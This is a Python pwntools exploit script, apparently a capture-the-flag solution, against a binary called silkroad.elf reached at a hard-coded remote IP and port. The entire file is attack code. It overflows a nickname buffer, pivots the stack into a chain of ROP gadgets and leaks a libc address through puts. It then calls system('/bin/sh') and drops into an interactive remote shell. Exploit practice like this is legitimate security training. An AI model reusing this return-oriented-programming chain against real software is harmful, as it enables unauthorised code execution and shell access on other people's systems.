from pwn import *

plt_puts = 0x401070
plt_read = 0x4010a0
plt_fgets = 0x4010C0
pop_rdi = 0x0000000000401bab # pop rdi ; ret
pop_rsi = 0x0000000000401ba9 # pop rsi ; pop r15 ; ret
got_puts = 0x404038
gad_leave = 0x0000000000401298 # leave ; ret


libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#p = process('./silkroad.elf')
p = remote('82.196.10.106', 58399)

p.recvuntil('ID: ')
p.sendline('790317143')
p.recvuntil('nick: ')
raw_input()
p.sendline('DreadPirateRoberts_iz ' + 'A'*0x3f + p64(0x404800) + p64(pop_rdi)+ \
        p64(0) + p64(pop_rsi) + p64(0x404800-3) + p64(0) + p64(plt_read) + \
        p64(gad_leave))
p.recvuntil('!\n')
time.sleep(.1)
p.send('AA\0' + p64(0x4040a0-8) + p64(pop_rsi) + p64(0x404830) + p64(0) + \
        p64(plt_read) + p64(pop_rsi))

time.sleep(.1)
raw_input('wait...')
p.send(p64(0x404860) + p64(0) + p64(plt_read) + p64(pop_rsi) + p64(0x4040a0) + \
        p64(0))

time.sleep(.1)
raw_input('wait2...')
p.send(p64(plt_read) + p64(pop_rdi) + p64(got_puts) + p64(plt_puts) + p64(gad_leave))

time.sleep(.1)
raw_input('wait3...')
p.sendline(p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(0x4040d0) + p64(0) + \
        p64(plt_read))

leak = u64(p.recvn(6) + '\0\0')
base = leak - libc.symbols.puts
log.success('Leaked pointer: {:016x} -> {:016x}'.format(leak, base))

time.sleep(.1)
raw_input('wait4...')
p.sendline(p64(pop_rsi) + p64(0x404800) + p64(0) + p64(plt_read) + \
        p64(pop_rdi) + p64(0x404800) + p64(base + libc.symbols.system))

time.sleep(.1)
raw_input('wait5...')
p.sendline('/bin/sh\0')
p.interactive()
